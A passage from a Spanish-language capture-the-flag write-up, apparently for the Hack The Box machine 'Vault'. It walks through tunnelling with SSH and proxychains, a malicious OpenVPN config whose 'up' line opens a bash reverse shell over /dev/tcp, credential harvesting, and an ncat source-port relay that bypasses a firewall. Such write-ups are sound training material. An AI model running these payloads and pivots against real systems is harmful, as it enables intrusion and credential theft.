    link/ether fe:54:00:17:ab:49 brd ff:ff:ff:ff:ff:ff
    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0
       valid_lft forever preferred_lft forever
4: virbr0-nic: <BROADCAST,MULTICAST> mtu 1500 qdisc pfifo_fast state DOWN group default qlen 1000
    link/ether 52:54:00:ff:fd:68 brd ff:ff:ff:ff:ff:ff
5: vnet0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast master virbr0 state UNKNOWN group default qlen 1000
    link/ether fe:54:00:3a:3b:d5 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::fc54:ff:fe3a:3bd5/64 scope link
       valid_lft forever preferred_lft forever
6: vnet1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast master virbr0 state UNKNOWN group default qlen 1000
    link/ether fe:54:00:e1:74:41 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::fc54:ff:fee1:7441/64 scope link
       valid_lft forever preferred_lft forever
7: vnet2: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast master virbr0 state UNKNOWN group default qlen 1000
    link/ether fe:54:00:c6:70:66 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::fc54:ff:fec6:7066/64 scope link
       valid_lft forever preferred_lft forever
8: vnet3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast master virbr0 state UNKNOWN group default qlen 1000
    link/ether fe:54:00:17:ab:49 brd ff:ff:ff:ff:ff:ff
    inet6 fe80::fc54:ff:fe17:ab49/64 scope link
       valid_lft forever preferred_lft forever
dave@ubuntu:~$ ip r
default via 10.10.10.2 dev ens33 onlink
10.10.10.0/24 dev ens33  proto kernel  scope link  src 10.10.10.109
169.254.0.0/16 dev ens33  scope link  metric 1000
192.168.122.0/24 dev virbr0  proto kernel  scope link  src 192.168.122.1
```

Para llegar a los *Servers* usamos la interface virbr0, la cual tiene una dirección en el mismo segmento de los indicados en servidores.

Veamos las conexiones:

```text
dave@ubuntu:~/Desktop$ netstat -pltune
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode       PID/Program name
tcp        0      0 127.0.0.1:5902          0.0.0.0:*               LISTEN      64055      29708       -
tcp        0      0 192.168.122.1:53        0.0.0.0:*               LISTEN      0          27851       -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          28563       -
tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      0          31186       -
tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      64055      28042       -
tcp        0      0 127.0.0.1:5901          0.0.0.0:*               LISTEN      64055      28331       -
tcp6       0      0 :::80                   :::*                    LISTEN      0          22789       -
tcp6       0      0 :::22                   :::*                    LISTEN      0          28565       -
tcp6       0      0 ::1:631                 :::*                    LISTEN      0          31185       -
tcp6       0      0 :::1337                 :::*                    LISTEN      1001       77658       3370/chisel
udp        0      0 0.0.0.0:5353            0.0.0.0:*                           111        22601       -
udp        0      0 0.0.0.0:38310           0.0.0.0:*                           111        22603       -
udp        0      0 192.168.122.1:53        0.0.0.0:*                           0          27850       -
udp        0      0 0.0.0.0:67              0.0.0.0:*                           0          27847       -
udp        0      0 0.0.0.0:631             0.0.0.0:*                           0          31196       -
udp6       0      0 :::5353                 :::*                                111        22602       -
udp6       0      0 :::34539                :::*                                111        22604       -
```

Interesante, en localhost tenemos varios servicios corriendo, inclusive algunos ejecutandose desde el usuario con ID 64055. Veamos quien es este usuario:

```text
dave@ubuntu:~$ cat /etc/passwd | grep 64055
libvirt-qemu:x:64055:129:Libvirt Qemu,,,:/var/lib/libvirt:/bin/false
```

Vemos que se trata de libvirt-qemu, lo cual nos hace _click_ con el nombre de las interfaces que vimos antes. Esto significa que tenemos al menos 3 maquinas virtuales (de acuerdo al documento anterior) que están virtualizadas sobre ubuntu.

Veamos los procesos de las maquinas virtuales:

```text
dave@ubuntu:~/Desktop$ ps -fea

{OMITIDO}

libvirt+   1711      1  4 Mar16 ?        00:07:45 qemu-system-x86_64 -enable-kvm -name DNS -S -machine pc-i440fx-xenial,accel=kvm,usb=off -cpu qemu32 -m 1024 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -uuid 4c7b43f8-23d1-4e7d-a219-d55eb0c899a6 -no-user-config -nodefaults -chardev socket,id=charmonitor,path=/var/lib/libvirt/qemu/domain-DNS/monitor.sock,server,nowait -mon chardev=charmonitor,id=monitor,mode=control -rtc base=utc,driftfix=slew -global kvm-pit.lost_tick_policy=discard -no-hpet -no-shutdown -global PIIX4_PM.disable_s3=1 -global PIIX4_PM.disable_s4=1 -boot strict=on -device ich9-usb-ehci1,id=usb,bus=pci.0,addr=0x6.0x7 -device ich9-usb-uhci1,masterbus=usb.0,firstport=0,bus=pci.0,multifunction=on,addr=0x6 -device ich9-usb-uhci2,masterbus=usb.0,firstport=2,bus=pci.0,addr=0x6.0x1 -device ich9-usb-uhci3,masterbus=usb.0,firstport=4,bus=pci.0,addr=0x6.0x2 -device virtio-serial-pci,id=virtio-serial0,bus=pci.0,addr=0x5 -drive file=/var/lib/libvirt/images/DNS.qcow2,format=qcow2,if=none,id=drive-ide0-0-0 -device ide-hd,bus=ide.0,unit=0,drive=drive-ide0-0-0,id=ide0-0-0,bootindex=1 -drive if=none,id=drive-ide0-0-1,readonly=on -device ide-cd,bus=ide.0,unit=1,drive=drive-ide0-0-1,id=ide0-0-1 -netdev tap,fd=25,id=hostnet0 -device rtl8139,netdev=hostnet0,id=net0,mac=52:54:00:17:ab:49,bus=pci.0,addr=0x3 -chardev pty,id=charserial0 -device isa-serial,chardev=charserial0,id=serial0 -chardev spicevmc,id=charchannel0,name=vdagent -device virtserialport,bus=virtio-serial0.0,nr=1,chardev=charchannel0,id=channel0,name=com.redhat.spice.0 -spice port=5900,addr=127.0.0.1,disable-ticketing,image-compression=off,seamless-migration=on -device qxl-vga,id=video0,ram_size=67108864,vram_size=67108864,vgamem_mb=16,bus=pci.0,addr=0x2 -device intel-hda,id=sound0,bus=pci.0,addr=0x4 -device hda-duplex,id=sound0-codec0,bus=sound0.0,cad=0 -chardev spicevmc,id=charredir0,name=usbredir -device usb-redir,chardev=charredir0,id=redir0 -chardev spicevmc,id=charredir1,name=usbredir -device usb-redir,chardev=charredir1,id=redir1 -device virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x7 -msg timestamp=on
root       1729      2  0 Mar16 ?        00:00:00 [kvm-pit/1711]
libvirt+   1878      1  3 Mar16 ?        00:06:28 qemu-system-x86_64 -enable-kvm -name Firewall -S -machine pc-i440fx-xenial,accel=kvm,usb=off -cpu qemu32 -m 1024 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -uuid cd3065e0-8cff-4ca0-99e8-9f2b545467a8 -no-user-config -nodefaults -chardev socket,id=charmonitor,path=/var/lib/libvirt/qemu/domain-Firewall/monitor.sock,server,nowait -mon chardev=charmonitor,id=monitor,mode=control -rtc base=utc,driftfix=slew -global kvm-pit.lost_tick_policy=discard -no-hpet -no-shutdown -global PIIX4_PM.disable_s3=1 -global PIIX4_PM.disable_s4=1 -boot strict=on -device ich9-usb-ehci1,id=usb,bus=pci.0,addr=0x7.0x7 -device ich9-usb-uhci1,masterbus=usb.0,firstport=0,bus=pci.0,multifunction=on,addr=0x7 -device ich9-usb-uhci2,masterbus=usb.0,firstport=2,bus=pci.0,addr=0x7.0x1 -device ich9-usb-uhci3,masterbus=usb.0,firstport=4,bus=pci.0,addr=0x7.0x2 -device virtio-serial-pci,id=virtio-serial0,bus=pci.0,addr=0x6 -drive file=/var/lib/libvirt/images/Firewall.qcow2,format=qcow2,if=none,id=drive-ide0-0-0 -device ide-hd,bus=ide.0,unit=0,drive=drive-ide0-0-0,id=ide0-0-0,bootindex=1 -drive if=none,id=drive-ide0-0-1,readonly=on -device ide-cd,bus=ide.0,unit=1,drive=drive-ide0-0-1,id=ide0-0-1 -netdev tap,fd=26,id=hostnet0 -device rtl8139,netdev=hostnet0,id=net0,mac=52:54:00:3a:3b:d5,bus=pci.0,addr=0x3 -netdev tap,fd=28,id=hostnet1 -device rtl8139,netdev=hostnet1,id=net1,mac=52:54:00:e1:74:41,bus=pci.0,addr=0x4 -chardev pty,id=charserial0 -device isa-serial,chardev=charserial0,id=serial0 -chardev spicevmc,id=charchannel0,name=vdagent -device virtserialport,bus=virtio-serial0.0,nr=1,chardev=charchannel0,id=channel0,name=com.redhat.spice.0 -spice port=5901,addr=127.0.0.1,disable-ticketing,image-compression=off,seamless-migration=on -device qxl-vga,id=video0,ram_size=67108864,vram_size=67108864,vgamem_mb=16,bus=pci.0,addr=0x2 -device intel-hda,id=sound0,bus=pci.0,addr=0x5 -device hda-duplex,id=sound0-codec0,bus=sound0.0,cad=0 -chardev spicevmc,id=charredir0,name=usbredir -device usb-redir,chardev=charredir0,id=redir0 -chardev spicevmc,id=charredir1,name=usbredir -device usb-redir,chardev=charredir1,id=redir1 -device virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x8 -msg timestamp=on
root       1896      2  0 Mar16 ?        00:00:00 [kvm-pit/1878]
libvirt+   1977      1  3 Mar16 ?        00:06:21 qemu-system-x86_64 -enable-kvm -name Vault -S -machine pc-i440fx-xenial,accel=kvm,usb=off -cpu qemu32 -m 1024 -realtime mlock=off -smp 1,sockets=1,cores=1,threads=1 -uuid 5c8d1542-2e9b-405a-a1a1-5435f25bf154 -no-user-config -nodefaults -chardev socket,id=charmonitor,path=/var/lib/libvirt/qemu/domain-Vault/monitor.sock,server,nowait -mon chardev=charmonitor,id=monitor,mode=control -rtc base=utc,driftfix=slew -global kvm-pit.lost_tick_policy=discard -no-hpet -no-shutdown -global PIIX4_PM.disable_s3=1 -global PIIX4_PM.disable_s4=1 -boot strict=on -device ich9-usb-ehci1,id=usb,bus=pci.0,addr=0x6.0x7 -device ich9-usb-uhci1,masterbus=usb.0,firstport=0,bus=pci.0,multifunction=on,addr=0x6 -device ich9-usb-uhci2,masterbus=usb.0,firstport=2,bus=pci.0,addr=0x6.0x1 -device ich9-usb-uhci3,masterbus=usb.0,firstport=4,bus=pci.0,addr=0x6.0x2 -device virtio-serial-pci,id=virtio-serial0,bus=pci.0,addr=0x5 -drive file=/var/lib/libvirt/images/Vault.qcow2,format=qcow2,if=none,id=drive-ide0-0-0 -device ide-hd,bus=ide.0,unit=0,drive=drive-ide0-0-0,id=ide0-0-0,bootindex=1 -drive if=none,id=drive-ide0-0-1,readonly=on -device ide-cd,bus=ide.0,unit=1,drive=drive-ide0-0-1,id=ide0-0-1 -netdev tap,fd=27,id=hostnet0 -device rtl8139,netdev=hostnet0,id=net0,mac=52:54:00:c6:70:66,bus=pci.0,addr=0x3 -chardev pty,id=charserial0 -device isa-serial,chardev=charserial0,id=serial0 -chardev spicevmc,id=charchannel0,name=vdagent -device virtserialport,bus=virtio-serial0.0,nr=1,chardev=charchannel0,id=channel0,name=com.redhat.spice.0 -spice port=5902,addr=127.0.0.1,disable-ticketing,image-compression=off,seamless-migration=on -device qxl-vga,id=video0,ram_size=67108864,vram_size=67108864,vgamem_mb=16,bus=pci.0,addr=0x2 -device intel-hda,id=sound0,bus=pci.0,addr=0x4 -device hda-duplex,id=sound0-codec0,bus=sound0.0,cad=0 -chardev spicevmc,id=charredir0,name=usbredir -device usb-redir,chardev=charredir0,id=redir0 -chardev spicevmc,id=charredir1,name=usbredir -device usb-redir,chardev=charredir1,id=redir1 -device virtio-balloon-pci,id=balloon0,bus=pci.0,addr=0x7 -msg timestamp=on
root       1997      2  0 Mar16 ?        00:00:00 [kvm-pit/1977]
```

Armando una rápida tabla sobre esta información tenemos:

| name | MAC | SPICE |
| ---  | --- | ---   |
| DNS   | 52:54:00:17:ab:49  | spice://127.0.0.1:5900  |
| Firewall  |  52:54:00:3a:3b:d5 and 52:54:00:e1:74:41 | spice://127.0.0.1:5901  |
| Vault  | 52:54:00:c6:70:66  | spice://127.0.0.1:5902  |

Como la maquina se llama **Vault**, debemos llegar hasta ella. Copie las MAC para observar y tratar de determinar una topología de L2 que nos pueda ayudar a entender como se intercomunican y mas aun, como desde ubuntu podemos llegar.

El spice es importante porque básicamente podemos conectarnos a cualquier maquina y tener la salida del monitor.

Veamos que tenemos en nuestra tabla de ARP:

```text
dave@ubuntu:~$ arp -a
? (192.168.122.4) at 52:54:00:17:ab:49 [ether] on virbr0
? (10.10.10.2) at 00:50:56:aa:9c:8d [ether] on ens33
? (192.168.122.5) at 52:54:00:3a:3b:d5 [ether] on virbr0
```

Tenemos las dos direcciones IP del archivo _Server_ que ahora podemos correlacionar con las MAC. Como podemos observar nos hacen falta 2 MAC, lo que nos indica que por L2 no tenemos acceso, forzándonos a comprender que dichas MAC se encuentran en otro segmento de red. Si, Firewall tiene dos tarjetas, por lo que una da directo hacia ubuntu (en L3) y la otra va hacia otro bridge entre Vault y Firewall.

{{<mermaid align="center">}}
graph TD;
    0(ubuntu)
    0-->|192.168.122.0/24|1(DNS);
    0-->|192.168.122.0/24|2(Firewall)
    2-->|x.x.x.x|3(Vault);
{{< /mermaid >}}

# Tunneling from ubuntu

Ahora que hemos comprendido que desde ubuntu tenemos que llegar a DNS y Firewall, viene el problema de que no sabemos nada mas que sus direcciones IP. Enumerando un poco mas el servicio SSH que estamos usando actualmente, encontraremos que para nuestra fortuna algunas opciones están habilitadas para hacer una dirección de puertos:

```text
dave@ubuntu:~$ cat /etc/ssh/sshd_config | grep -Ev '^$|^#'
Port 22
Protocol 2
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_dsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
HostKey /etc/ssh/ssh_host_ed25519_key
UsePrivilegeSeparation yes
KeyRegenerationInterval 3600
ServerKeyBits 1024
SyslogFacility AUTH
LogLevel INFO
LoginGraceTime 120
PermitRootLogin prohibit-password
StrictModes yes
RSAAuthentication yes
PubkeyAuthentication yes
IgnoreRhosts yes
RhostsRSAAuthentication no
HostbasedAuthentication no
PermitEmptyPasswords no
ChallengeResponseAuthentication no
X11Forwarding yes
X11DisplayOffset 10
PrintMotd no
PrintLastLog yes
TCPKeepAlive yes
AcceptEnv LANG LC_*
Subsystem sftp /usr/lib/openssh/sftp-server
UsePAM yes
AllowTCPForwarding yes
GatewayPorts yes
PermitOpen any
MaxSessions 1000000
PermitTunnel yes
```

Esto nos permite establecer una VPN de SSH en la cual mandamos sobre una conexión de SSH trafico como si _ubuntu_ generar el trafico. Esta técnica era bastante utilizada antes, cuando por ejemplo te querías conectar desde un cibercafé a tu casa o si no confiabas en la red, podías tunelear todo tu trafico hasta tu casa y usar tu salida a internet.

Primero definimos un puerto que acepte todas las conexiones y que se convierta en el listener o en el proxy:

```text
xbytemx@laptop:~/htb/vault$ ssh -f -N -D 9050 dave@10.10.10.109
dave@10.10.10.109's password:

```

- `-f`
- `-N`
- `-D 9050`
- `dave@10.10.10.109`

Después usando proxychains, el cual por defecto usa el puerto 9050 y la ip 127.0.0.1, ejecuta sobre la conexión un nmap por ejemplo:

```text
root@laptop:~# proxychains nmap -sT --open -n -v 192.168.122.5
ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-17 17:39 CST
Initiating Ping Scan at 17:39
Scanning 192.168.122.5 [4 ports]
Completed Ping Scan at 17:39, 0.23s elapsed (1 total hosts)
Initiating Connect Scan at 17:39
Scanning 192.168.122.5 [1000 ports]
Completed Connect Scan at 17:42, 154.31s elapsed (1000 total ports)
Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 154.64 seconds
           Raw packets sent: 4 (152B) | Rcvd: 1 (40B)
```

Las opciones son muy parecida a las anteriores, con la diferencia que para este escaneo utilice `-sT` en lugar de `-sS`, ya que por mi topología tuneleada, necesito establecer conexiones completas en lugar de solo mandar SYN.

También en este escaneo hacia Firewall, podemos ver que ningún puerto contesto como abierto. Continuemos sobre DNS:

```text
# Nmap 7.70 scan initiated Sun Mar 17 17:42:45 2019 as: nmap -sT --open -n -v -oN DNS-proxychains-nmap.nmap 192.168.122.4
Nmap scan report for 192.168.122.4
Host is up (0.15s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Mar 17 17:45:17 2019 -- 1 IP address (1 host up) scanned in 152.10 seconds
```

Ahora en la salida de este archivo (_DNS-proxychains-nmap.nmap_) podemos ver que DNS tiene dos puertos abiertos, uno es el 22 y el otro el 80.

Utilizando `httpie` exploremos el servidor web:

```html
xbytemx@laptop:~/htb/vault$ proxychains http 192.168.122.4
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.122.4:80-<><>-OK
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 153
Content-Type: text/html; charset=UTF-8
Date: Sun, 17 Mar 2019 23:47:16 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding

<h1> Welcome to the Sparklays DNS Server </h1>
<p>
<a href="dns-config.php">Click here to modify your DNS Settings</a><br>
<a href="vpnconfig.php">Click here to test your VPN Configuration</a>
```

Encontramos desde index.html, dos archivos más: _vpnconfig.php_ y _dns-config.php_. Veamos su contenido:

```html
xbytemx@laptop:~/htb/vault$ proxychains http 192.168.122.4/dns-config.php
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.122.4:80-<><>-OK
HTTP/1.1 404 Not Found
Connection: Keep-Alive
Content-Length: 291
Content-Type: text/html; charset=iso-8859-1
Date: Sun, 17 Mar 2019 23:47:27 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.18 (Ubuntu)

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /dns-config.php was not found on this server.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 192.168.122.4 Port 80</address>
</body></html>

xbytemx@laptop:~/htb/vault$ proxychains http 192.168.122.4/vpnconfig.php
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.122.4:80-<><>-OK
HTTP/1.1 200 OK
Connection: Keep-Alive
Content-Encoding: gzip
Content-Length: 295
Content-Type: text/html; charset=UTF-8
Date: Sun, 17 Mar 2019 23:47:39 GMT
Keep-Alive: timeout=5, max=100
Server: Apache/2.4.18 (Ubuntu)
Vary: Accept-Encoding

<!-- HTML form -->
<html>
<h1> VPN Configurator </h1><p>
Here you can modify your .ovpn file and execute it.<p>
Note: nobind must be used. <p>
<form action="vpnconfig.php?function=testvpn" method="post">
<textarea rows="10" cols="40" name="text"></textarea><p>
<input type="submit" value="Update file">
<input type="hidden" name="resulturl" value="google.com">

<p>
<a href="vpnconfig.php?function=testvpn" class="mybutton">Test VPN</a>
</html>
```

Parece que tenemos un configurador de OpenVPN (.ovpn) justo como el que hackthebox nos entrega para conectarnos. Esto significa que probablemente el path sea explotar alguna vulnerabilidad en OVPN que nos permita entrar a DNS.

# Reverse Shell from DNS

Googleando un poco encontraremos el siguiente [articulo](https://medium.com/tenable-techblog/reverse-shell-from-an-openvpn-configuration-file-73fd8b1d38da), el cual nos explica como aprovecharnos y realizar un RCE sobre un servidor de OVPN. Usando esta técnica, desarrolle el siguiente archivo ovpn:

```text
remote 192.168.122.1
dev tun
nobind
script-security 2
up "/bin/bash -c '/bin/bash -i > /dev/tcp/192.168.122.1/3001 0<&1 2>&1&'"
```

Tenemos el comando a ejecutarse después de que la vpn se levante, que es básicamente un reverse shell y el remote de la conexión, osea la maquina _ubuntu_. Levantamos un netcat para recibir la conexión en _ubuntu_ y usando proxychains subimos via post el contenido del archivo ovpn:

```text
xbytemx@laptop:~/htb/vault$ proxychains http -f POST "http://192.168.122.4/vpnconfig.php?function=testvpn" submit="Update file" text="remote 192.168.122.1\ndev tun\nnobind\nscript-security 2\nup \"/bin/bash -c \'/bin/bash -i > /dev/tcp/192.168.122.1/3001 0<&1 2>&1&\'\""
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.122.4:80-<><>-OK

http: error: Request timed out (30s).
```

En nuestro listener debemos recibir la conexión remota de DNS:

```text
dave@ubuntu:~$ nc -vlnp 3001
Listening on [0.0.0.0] (family 0, port 3001)
Connection from [192.168.122.4] port 3001 [tcp/*] accepted (family 2, sport 33836)
bash: cannot set terminal process group (1076): Inappropriate ioctl for device
bash: no job control in this shell
root@DNS:/var/www/html#

root@DNS:/var/www/html# id
id
uid=0(root) gid=0(root) groups=0(root)
```

yey ya somos root! pero en DNS ):

Ahora que hemos ingresado en nuestra primera maquina, veamos que encontramos por aquí:

```text
root@DNS:/var/www/html# cd /home
cd /home
root@DNS:/home# ls
ls
alex
dave
root@DNS:/home# cd dave
cd dave
root@DNS:/home/dave# ls
ls
ssh
user.txt
root@DNS:/home/dave# cat ssh
cat ssh
dave
dav3gerous567
```

Parece que tenemos otras credenciales para entrar por SSH.

```text
dave@ubuntu:~$ ssh dave@192.168.122.4
dave@192.168.122.4's password:
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

98 packages can be updated.
50 updates are security updates.


Last login: Mon Sep  3 16:38:03 2018
dave@DNS:~$
```

> creds: dave / dav3gerous567

# cat user.txt

```text
root@DNS:/home/dave# cat user.txt
cat user.txt
```
# Enumerating DNS from root

Validemos que puede hacer _dave_ en esta maquina o porque es tan importante:

```text
root@DNS:/home/dave# sudo -l -U dave
sudo -l -U dave
Matching Defaults entries for dave on DNS:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dave may run the following commands on DNS:
    (ALL : ALL) ALL
```

Gracias a `sudo -s` podremos regresar a root en cualquier momento usando a _dave_.

Después de revolotear un poco el gallinero y tratar de identificar si DNS se conecta a Vault o a Firewall, encontraremos algo interesante sobre las rutas:

```text
root@DNS:/home/dave# ip r
ip r
192.168.5.0/24 via 192.168.122.5 dev ens3
192.168.122.0/24 dev ens3  proto kernel  scope link  src 192.168.122.4
```

Esto nos indica que DNS se puede conectar a la red entre Firewall y Vault, mas aun que la red entre ellos es alcanzada gracias a Firewall y el segmento es 192.168.5.0/24.

Estuve buscando sobre etc y var referencias a la red 192.168.5.0/24, hasta que di con auth.log:

```text
root@DNS:/home/dave# find /var/log/ -type f -exec grep "192.168.5." {} \;
find /var/log/ -type f -exec grep "192.168.5." {} \;
Binary file /var/log/auth.log matches
Binary file /var/log/btmp matches
root@DNS:/home/dave# grep -a "192.168.5" /var/log/auth.log
grep -a "192.168.5" /var/log/auth.log
Jul 17 16:49:01 DNS sshd[1912]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
Jul 17 16:49:02 DNS sshd[1943]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
Jul 17 16:49:02 DNS sshd[1943]: Disconnected from 192.168.5.2 port 4444
Jul 17 17:21:38 DNS sshd[1560]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
Jul 17 17:21:38 DNS sshd[1590]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
Jul 17 17:21:38 DNS sshd[1590]: Disconnected from 192.168.5.2 port 4444
Jul 17 21:58:26 DNS sshd[1171]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
Jul 17 21:58:29 DNS sshd[1249]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
Jul 17 21:58:29 DNS sshd[1249]: Disconnected from 192.168.5.2 port 4444
Jul 24 15:06:10 DNS sshd[1466]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
Jul 24 15:06:10 DNS sshd[1496]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
Jul 24 15:06:10 DNS sshd[1496]: Disconnected from 192.168.5.2 port 4444
Jul 24 15:06:26 DNS sshd[1500]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=192.168.5.2  user=dave
Jul 24 15:06:28 DNS sshd[1500]: Failed password for dave from 192.168.5.2 port 4444 ssh2
Jul 24 15:06:28 DNS sshd[1500]: Connection closed by 192.168.5.2 port 4444 [preauth]
Jul 24 15:06:57 DNS sshd[1503]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
Jul 24 15:06:57 DNS sshd[1533]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
Jul 24 15:06:57 DNS sshd[1533]: Disconnected from 192.168.5.2 port 4444
Jul 24 15:07:21 DNS sshd[1536]: Accepted password for dave from 192.168.5.2 port 4444 ssh2
Jul 24 15:07:21 DNS sshd[1566]: Received disconnect from 192.168.5.2 port 4444:11: disconnected by user
Jul 24 15:07:21 DNS sshd[1566]: Disconnected from 192.168.5.2 port 4444
Sep  2 15:07:51 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 -f
Sep  2 15:10:20 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53
Sep  2 15:10:34 DNS sudo:     dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53
root@DNS:/home/dave#
```

Con esto sabemos que una de las dos maquinas tiene la dirección 192.168.5.2, que conoce las credenciales de dave, y que el puerto TCP/4444 es relevante para las conexiones.

Las ultimas 3 lineas indican que es posible escanear la 192.168.5.2, pero que probablemente este filtrado el puerto de origen.
La penúltima y antepenúltima, que el puerto 987 esta abierto en 192.168.5.2, pero hay que redirigirlo para poder establecer una conexión.

Entonces tenemos un diagrama como el siguiente:

{{<mermaid align="left">}}
sequenceDiagram
    participant xbytemx
    participant ubuntu
    participant DNS
    participant Firewall
    participant Vault

    xbytemx->ubuntu: ssh -f -N -D 9050 dave@10.10.10.109
    Note right of ubuntu: Establecemos el túnel para proxear
    xbytemx->DNS: proxychains ssh dave@192.168.122.4
    Note right of DNS: Nos conectamos por ssh sobre el túnel a DNS
    DNS-->>Vault: PERMITIDO src:TCP/53,TCP/4444 dst:TCP/987
    Vault-->>DNS: PERMITIDO src:TCP/53 dst:ALL?

{{</mermaid>}}

# Connecting to Vault

Ahora que hemos comprendido mejor como podríamos bypasear las reglas del firewall, podemos construir un listener del puerto 987 de Vault:

```text
xbytemx@laptop:~/htb/vault$ proxychains ssh dave@192.168.122.4 "ncat -l 3001 --sh-exec \"ncat 192.168.5.2 987 --source-port=4444\""
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.122.4:22-<><>-OK
The authenticity of host '192.168.122.4 (192.168.122.4)' can't be established.
ECDSA key fingerprint is SHA256:pV1weQff3mDVKDCfervdnstlBaTvDBnCu2eQfUegT3w.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.122.4' (ECDSA) to the list of known hosts.
dave@192.168.122.4's password:

```

Lo que hace este comando es usar el proxychain para lanzar un ssh hacia DNS, el cual lanza el comando ncat como listener en el puerto 3001, que a su vez lanza el comando ncat hacia Vault en el puerto 987, usando el puerto origen 4444 que ya vimos que esta permitido.

Con un nmap veremos que el servicio del puerto 987 de la 192.168.5.2 es en realidad un servidor SSH, por lo que conectándonos por ssh sobre el proxychains entraremos por fin a vault.

Usaremos las credenciales que encontramos en DNS sobre dave (recordemos los logs de auth):

```text
xbytemx@laptop:~/htb/vault$ proxychains ssh dave@192.168.122.4 -p3001
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.122.4:3001-<><>-OK
The authenticity of host '[192.168.122.4]:3001 ([192.168.122.4]:3001)' can't be established.
ECDSA key fingerprint is SHA256:Wo70Zou+Hq5m/+G2vuKwUnJQ4Rwbzlqhq2e1JBdjEsg.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '[192.168.122.4]:3001' (ECDSA) to the list of known hosts.
dave@192.168.122.4's password:
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-116-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

96 packages can be updated.
49 updates are security updates.


Last login: Mon Sep  3 16:48:00 2018
dave@vault:~$ ls
root.txt.gpg
dave@vault:~$
```

# get root.txt.gpg

Ya que entramos a Vault, encontramos un archivo en el home de dave, el cual es un archivo gpg. Lo descargamos:

```text
xbytemx@laptop:~/htb/vault$ proxychains scp -P 3001 dave@192.168.122.4:/home/dave/root.txt.gpg .
ProxyChains-3.1 (http://proxychains.sf.net)
|S-chain|-<>-127.0.0.1:9050-<><>-192.168.122.4:3001-<><>-OK
dave@192.168.122.4's password:
Permission denied, please try again.
dave@192.168.122.4's password:
root.txt.gpg                                                                                         100%  629     4.0KB/s   00:00
```

Explorando las maquinas, encontraremos que en ubuntu podemos acceder al _secring_ de dave, por lo que lo descargamos e importamos:

```text
xbytemx@laptop:~/htb/vault$ gpg --import ubuntu-gnupg/secring.gpg
gpg: clave 9067DED00FDFBFE4: clave pública "david <dave@david.com>" importada
